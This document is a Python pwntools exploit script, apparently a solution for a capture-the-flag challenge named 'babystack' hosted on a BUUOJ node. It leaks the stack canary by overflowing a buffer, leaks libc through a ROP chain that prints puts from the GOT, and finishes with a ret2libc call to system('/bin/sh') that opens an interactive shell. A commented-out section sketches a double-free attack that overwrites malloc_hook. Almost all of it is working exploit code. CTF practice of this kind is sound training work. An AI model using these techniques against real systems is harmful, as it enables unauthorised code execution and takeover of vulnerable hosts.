from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, search_fun='', path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
		if search_fun == '':
			return (base, system, binsh)
		search_addr = base + libc.dump(search_fun)
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))
		if search_fun == '':
			return (base, system, binsh)
		search_addr = base + libc.sym[search_fun]

	return (base, system, binsh, search_addr)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './babystack'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',28742) if argv[1]=='r' else process(binary)
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def bytes2int(content):
	return str(content,encoding='utf-8')

def dbg():
	gdb.attach(p)
	pause()
# get carry
sla(b'>> ', b'1')
sl(b'a'*0x88)
# dbg()
sla(b'>> ', b'2')
ru(b'a'*0x88+b'\n')
carry = u64(r(7).rjust(8,b'\x00'))
print(hex(carry))

#ret2libc
pop_rdi_ret = 0x400a93
main_addr = 0x400908
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']

#get libc base
sla(b'>> ', b'1')
payload = b'a'* (0x88) + p64(carry) + b'a'*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
sl(payload)
sla(b'>> ', b'3')
puts_addr = uu64(r(6))
base, system_addr, bin_sh_addr = ret2libc(puts_addr,'puts')

#attack
sla(b'>> ', b'1')
payload = b'a'* (0x88) + p64(carry) + b'a'*8 + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) + p64(main_addr)
sl(payload)
sla(b'>> ', b'3')
itr()


#double free做法
# add(0x68, b'a', 0x20, b'b')
# add(0x68, b'c', 0x20, b'd')
# delete(1)
# delete(2)
# delete(1)
# # dbg()
# add(0x68, p64(malloc_hook - 0x23), 0x68, p64(0))
# # dbg()
# add(0x68, p64(0), 0x68, b'a'*0x13 + p64(one_gadget[3] + libc_base))
# # dbg()
# sla(b'> Now please tell me what you want to do :', b'1')
# sla(b'> O\'s length : ', int2bytes(0x20))
# itr()